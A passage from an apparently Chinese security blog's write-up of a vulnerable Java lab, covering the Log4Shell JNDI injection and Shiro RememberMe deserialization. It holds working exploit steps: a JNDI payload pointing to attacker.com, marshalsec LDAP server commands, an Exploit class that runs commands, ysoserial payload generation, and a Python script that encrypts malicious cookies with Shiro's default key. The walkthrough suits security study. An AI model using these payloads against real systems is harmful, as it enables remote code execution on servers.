<p>攻击者可通过构造恶意日志触发<strong>LDAP&#x2F;RMI请求</strong>，从远程服务器加载并执行任意代码。</p>
<p>也就是说java会通过JNDI去远程访问我们的服务器然后访问我们实现的方法类，下载并执行这个类</p>
<p>我们直接来看漏洞代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 不安全的JNDI查询方式（存在注入风险）</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnsafeJndiLookup</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unsafeLookup</span><span class="params">(String name)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="comment">// 1. 不安全的初始化方式 - 没有禁用远程代码加载</span></span><br><span class="line">        Hashtable&lt;String, String&gt; env = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.ldap.LdapCtxFactory&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 2. 允许使用任意LDAP服务器（危险！）</span></span><br><span class="line">        <span class="comment">// 攻击者可控制PROVIDER_URL指向恶意服务器</span></span><br><span class="line">        env.put(Context.PROVIDER_URL, <span class="string">&quot;ldap://任意服务器:389&quot;</span>);  </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 3. 没有设置安全属性</span></span><br><span class="line">        <span class="comment">// 缺少 com.sun.jndi.ldap.object.trustURLCodebase=false</span></span><br><span class="line">        </span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 4. 直接使用未经验证的用户输入进行查询（高危！）</span></span><br><span class="line">        <span class="keyword">return</span> ctx.lookup(name);  <span class="comment">// 如果name包含$&#123;jndi:ldap://攻击者服务器&#125;就会中招</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 5. 模拟攻击者输入（实际可能来自HTTP请求参数等）</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">maliciousInput</span> <span class="operator">=</span> <span class="string">&quot;$&#123;jndi:ldap://attacker.com/恶意类&#125;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 6. 触发漏洞</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> unsafeLookup(maliciousInput);</span><br><span class="line">            System.out.println(<span class="string">&quot;已加载对象: &quot;</span> + obj);</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个代码先是使用Hashtable创建一个键值对的对象，然后就是塞了一堆配置进去，关于配置懒得看太多</p>
<p>也就是说流程就是服务器没有对JNDI配置禁止加载远程代码等安全配置，然后又通过JNDI加载了攻击者服务器上面的危险类，然后通过执行这个类然后被RCE</p>
<p>至于恶意类github上面有这个脚本，我也不知道是怎么做到的</p>
<h3 id="2-复现过程"><a href="#2-复现过程" class="headerlink" title="2.复现过程"></a>2.复现过程</h3><p>还是太菜了，花了一两个小时才复现成功，特别是那个开启LDAP服务的时候，下那么多文件我以为要被填满了</p>
<p>我们首先来观察代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Log4j</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(<span class="string">&quot;Log4j&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * http://localhost:8080/log4j?token=$&#123;jndi:ldap://127.0.0.1:1389/0iun75&#125;</span></span><br><span class="line"><span class="comment">     * Default: error/fatal/off</span></span><br><span class="line"><span class="comment">     * Fix: Update log4j to lastet version.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/log4j&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">log4j</span><span class="params">(String token)</span> &#123;</span><br><span class="line">        logger.error(token);</span><br><span class="line">        <span class="keyword">return</span> token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:1389/Exploid&#125;&quot;</span>;</span><br><span class="line"><span class="comment">//将jndi协议指向我们的LDAP服务器上的恶意文件</span></span><br><span class="line">        logger.error(poc);</span><br><span class="line"><span class="comment">//在写入日志的时候会解析jndi协议下载并执行我们的恶意类</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在我们可以知道为什么这个Logger类型是什么了</p>
<p><strong><code>Logger</code> 是 Log4j 2 框架中的核心接口</strong>，用于记录日志消息。可以将其理解为 <strong>Log4j 定义的“日志工具”类型</strong>，开发者通过它来输出不同级别的日志（如 <code>info()</code>、<code>error()</code> 等）。</p>
<p>也就是说我们之前在后台看到的很多日志信息全是通过这个日志工具记录的，于是这个工具的RCE漏洞成了10.0最高级别的漏洞</p>
<p><strong>第一步:下载marshalsec开启LDAP服务器</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure>

<p>使用maven进行打包</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://127.0.0.1:1999/#Exploit&quot;</span></span><br><span class="line"><span class="comment">#开启LDAP协议 ip下有我们的恶意类 Exploit.class</span></span><br><span class="line"><span class="comment">#默认开启LDAP 1389端口</span></span><br></pre></td></tr></table></figure>



<p><strong>第二部:编译恶意类</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// Windows</span></span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">            <span class="comment">// Linux</span></span><br><span class="line">            <span class="comment">// Runtime.getRuntime().exec(&quot;/bin/bash -c &#x27;touch /tmp/pwned&#x27;&quot;);</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过这个类打开计算器，本来有脚本直接返回反弹shell的类的，但是好像和我的java版本不匹配，懒得重新装java了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Exploit.java</span><br></pre></td></tr></table></figure>

<p>编译java</p>
<p><strong>最后:触发漏洞</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:8080/log4j?token=%24%7Bjndi%3Aldap%3A%2F%2F127.0.0.1%3A1389%2FExploit%7D</span></span><br></pre></td></tr></table></figure>

<p>成功弹出计算器</p>




<h2 id="20-Shiro"><a href="#20-Shiro" class="headerlink" title="20.Shiro"></a>20.Shiro</h2><p>不得不说这个靶场的漏洞是真的多啊，我到现在都还没在网上找到一些完整的wp，太多漏洞见都没见过了</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shiro</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">byte</span>[] KEYS = java.util.Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">DELETE_ME</span> <span class="operator">=</span> <span class="string">&quot;deleteMe&quot;</span>;</span><br><span class="line">    <span class="type">AesCipherService</span> <span class="variable">acs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(value = &quot;/shiro/deserialize&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">shiro_deserialize</span><span class="params">(HttpServletRequest req, HttpServletResponse res)</span> &#123;</span><br><span class="line">        <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> getCookie(req, Constants.REMEMBER_ME_COOKIE);</span><br><span class="line"><span class="comment">//获取到我们的RememberMe cookie</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> == cookie) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No rememberMe cookie. Right?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">rememberMe</span> <span class="operator">=</span> cookie.getValue();</span><br><span class="line">            <span class="type">byte</span>[] b64DecodeRememberMe = java.util.Base64.getDecoder().decode(rememberMe);</span><br><span class="line">            <span class="type">byte</span>[] aesDecrypt = acs.decrypt(b64DecodeRememberMe, KEYS).getBytes();</span><br><span class="line"><span class="comment">//对我们的Cookie的值进行解码</span></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(aesDecrypt);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bytes);</span><br><span class="line">            in.readObject();</span><br><span class="line"><span class="comment">//进行反序列化</span></span><br><span class="line">            in.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            <span class="keyword">if</span> (CookieUtils.addCookie(res, <span class="string">&quot;rememberMe&quot;</span>, DELETE_ME))&#123;</span><br><span class="line">                log.error(e.getMessage());</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;RememberMe cookie decrypt error. Set deleteMe cookie success.&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Shiro deserialize&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个代码实现的是一个Shiro反序列化代码</p>
<p>在Java安全框架领域，<strong>Apache Shiro</strong>凭借其简洁易用的特性被广泛应用于身份认证、授权和会话管理。</p>
<p><strong>Apache Shiro 1.2.4及之前版本</strong>默认使用硬编码的<a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?content_id=254810199&content_type=Article&match_order=1&q=AES%E5%8A%A0%E5%AF%86&zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NTUxNzMwNTQsInEiOiJBRVPliqDlr4YiLCJ6aGlkYV9zb3VyY2UiOiJlbnRpdHkiLCJjb250ZW50X2lkIjoyNTQ4MTAxOTksImNvbnRlbnRfdHlwZSI6IkFydGljbGUiLCJtYXRjaF9vcmRlciI6MSwiemRfdG9rZW4iOm51bGx9.YwxdnaD2_Zfl8WO_26gbOd13ND6Zc1lSaKtFtvxN6rw&zhida_source=entity">AES加密</a>密钥，攻击者可利用该密钥构造恶意序列化数据，通过Shiro的RememberMe功能触发<strong>远程代码执行（RCE）</strong>。即使后续版本移除了默认密钥，若开发者未正确配置动态密钥，仍可能因密钥泄露导致漏洞。</p>
<p><strong>核心问题</strong></p>
<ul>
<li><strong>RememberMe功能</strong>：Shiro提供“记住我”功能，将用户身份信息序列化后加密存储在Cookie中。</li>
<li><strong>加密缺陷</strong>：使用硬编码的AES密钥（如默认密钥<code>kPH+bIxk5D2deZiIxcaaaA==</code>），攻击者可伪造恶意Cookie。</li>
<li><strong>危险操作</strong>：服务端在解密后直接调用<code>ObjectInputStream.readObject()</code>反序列化数据，导致任意代码执行。</li>
</ul>
<p>也就是说我们通过获取到AES加密的密钥，然后将我们生成的恶意序列化数据进行加密，Base64编码后放入Cookie中，服务器端获取到Cookie时会将其解密然后进行反序列化，java反序列化直接触发RCE</p>
<p>这个和普通的反序列化漏洞的区别在于这个不是直接进行反序列化而是需要我们获取AES加密的密钥，主要漏洞在于使用固定的硬编码密钥导致容易被获取</p>
<p>至于靶场的代码也是简单的复现了一下原理，获取我们的Cookie然后进行解码然后直接反序列化</p>
<p>现在重点就在于怎么对我们的数据进行加密</p>
<p>妈的，傻逼ds，给他个源代码叫他给我写加密脚本结果写了好几遍都是错的，浪费了我好长时间，看来是时候转GPT了，好在不知道为什么重新开了一个对话就写对脚本了</p>
<p>我们先使用脚本生成payload</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections5 <span class="string">&quot;calc.exe&quot;</span> &gt; payload.bin</span><br></pre></td></tr></table></figure>

<p>然后使用加密脚本进行加密</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">SHIRO_KEY = base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_shiro_payload</span>(<span class="params">payload_file</span>):</span><br><span class="line">    <span class="comment"># 1. 读取 payload</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(payload_file, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        payload = f.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 生成随机 IV（Shiro 默认行为）</span></span><br><span class="line">    iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">    cipher = AES.new(SHIRO_KEY, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 加密并拼接 IV + 密文</span></span><br><span class="line">    encrypted = cipher.encrypt(pad(payload, AES.block_size))</span><br><span class="line">    encrypted_with_iv = iv + encrypted  <span class="comment"># Shiro 的格式：IV在前</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4. Base64 编码</span></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(encrypted_with_iv).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用示例</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    cookie = encrypt_shiro_payload(<span class="string">&quot;payload.bin&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;可用的RememberMe Cookie:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(cookie)</span><br></pre></td></tr></table></figure>

<p>我们然后使用解密脚本看下解密结果是否合理</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="comment"># Shiro 默认密钥（Base64解码）</span></span><br><span class="line">SHIRO_KEY = base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shiro_decrypt</span>(<span class="params">remember_me_cookie</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;解密 Shiro 的 RememberMe Cookie&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># Base64 解码</span></span><br><span class="line">    encrypted_data = base64.b64decode(remember_me_cookie)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 提取 IV（前16字节）和实际密文</span></span><br><span class="line">    iv = encrypted_data[:<span class="number">16</span>]</span><br><span class="line">    ciphertext = encrypted_data[<span class="number">16</span>:]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># AES-CBC 解密</span></span><br><span class="line">    cipher = AES.new(SHIRO_KEY, AES.MODE_CBC, iv)</span><br><span class="line">    decrypted = cipher.decrypt(ciphertext)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 移除 PKCS#5/PKCS#7 填充</span></span><br><span class="line">    pad_length = decrypted[-<span class="number">1</span>]</span><br><span class="line">    decrypted = decrypted[:-pad_length]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例：输入你的 RememberMe Cookie</span></span><br><span class="line">remember_me_cookie = <span class="string">&quot;cookie&quot;</span></span><br><span class="line">decrypted_data = shiro_decrypt(remember_me_cookie)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出前16字节（通常是Java序列化数据的头部）</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密后的前16字节（Hex）：&quot;</span>, decrypted_data[:<span class="number">16</span>].<span class="built_in">hex</span>(<span class="string">&#x27; &#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密后的前16字节（ASCII）：&quot;</span>, decrypted_data[:<span class="number">16</span>])</span><br></pre></td></tr></table></figure>

<p>将我们的base64编码放入</p>


<p>然后放入靶场的Cookie的rememberMe中</p>


<p>服了，什么时候我可以自己写加密脚本，可惜我不是学密码的</p>
<h2 id="21"><a href="#21" class="headerlink" title="21."></a>21.</h2>
  </div>
  
  
    
    <div class='footer'>
       <!-- 参考资料、相关资料等 -->
      
       <!-- 相关文章 -->
      
      <!-- 版权声明组件 -->
      
      <!-- 打赏组件 -->
      
    </div>
  
  
    


  <div class='article-meta' id="bottom">
    <div class='new-meta-box'>
      
        
          <div class="new-meta-item date" itemprop="dateModified" datetime="2025-08-13T17:10:51+08:00">
  <a class='notlink'>
    <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
    <p>更新于：Aug 13, 2025</p>
  </a>
</div>

        
      
        
          

        
      
        
          
  <div class="new-meta-item share -mob-share-list">
  <div class="-mob-share-list share-body">
    
      
        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
          
          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2025/07/22/java-sec-code/&title=java_sec_code - Hexo&summary="
          
          >
          
            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
          
        </a>
      
    
      
        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
          
          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2025/07/22/java-sec-code/&title=java_sec_code - Hexo&summary="
          
          >
          
            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
          
        </a>
      
    
      
        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
          
          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2025/07/22/java-sec-code/&title=java_sec_code - Hexo&summary="
          
          >
          
            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
          
        </a>
      
    
      
    
      
    
  </div>
</div>



        
      
    </div>
    <!-- Custom Files bottomMeta begin -->
    
    <!-- Custom Files bottomMeta end -->
  </div>


  
  

  
    <div class="prev-next">
      
        <a class='prev' href='/2025/07/24/HNCTF-2022-WEEK2-Canyource/'>
          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>[HNCTF_2022_WEEK2]Canyource</p>
          <p class='content'>[HNCTF_2022_WEEK2]Canyource12345678910&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#x27;code&...</p>
        </a>
      
      
        <a class='next' href='/2025/07/20/JAVA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/'>
          <p class='title'>JAVA命令执行<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
          <p class='content'>JAVA命令执行前言java代码也基本可以看懂了，但是还是和以前遇到的问题一样，太多函数和包都不知道，只能先把代码看看
java中命令执行有三种方式
1.java.lang.Runtime特点：...</p>
        </a>
      
    </div>
  
  <!-- Custom Files postEnd begin-->
  
  <!-- Custom Files postEnd end-->
</article>


  


  <article class="post white-box shadow floatable blur" id="comments">
    <span hidden>
      <meta itemprop="discussionUrl" content="/2025/07/22/java-sec-code/index.html#comments">
    </span>
    <p ct><i class='fa-solid fa-comments'></i> 评论</p>
    

    <div id="layoutHelper-comments"></div>

  </article>






</div>
<aside id='l_side' itemscope itemtype="http://schema.org/WPSideBar">
  

  
    
    
      
    
  


<div class="widget-sticky pjax">

  
  


  <section class="widget toc-wrapper desktop mobile " id="toc-div" >
    
  <header>
    
      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
    
  </header>


    <div class='content'>
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-RCE"><span class="toc-text">1.RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#runtime-exec"><span class="toc-text">&#x2F;runtime&#x2F;exec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ProcessBuilder"><span class="toc-text">&#x2F;ProcessBuilder</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jscmd"><span class="toc-text">&#x2F;jscmd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#vuln-yarm"><span class="toc-text">&#x2F;vuln&#x2F;yarm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#groovy"><span class="toc-text">&#x2F;groovy</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-CommandInject"><span class="toc-text">2.CommandInject</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#codeinject"><span class="toc-text">&#x2F;codeinject</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#codeinject-host"><span class="toc-text">&#x2F;codeinject&#x2F;host</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#codeinject-sec"><span class="toc-text">&#x2F;codeinject&#x2F;sec</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Cookies"><span class="toc-text">3.Cookies</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Cors"><span class="toc-text">4.Cors</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-FileUpload"><span class="toc-text">5.FileUpload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#upload"><span class="toc-text">&#x2F;upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#upload-picture"><span class="toc-text">&#x2F;upload&#x2F;picture</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-CRLFInjection"><span class="toc-text">6.CRLFInjection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-Jsonp"><span class="toc-text">7.Jsonp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-Deserialize-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">8.Deserialize 序列化与反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-SSRF"><span class="toc-text">9.SSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-PathTraversal"><span 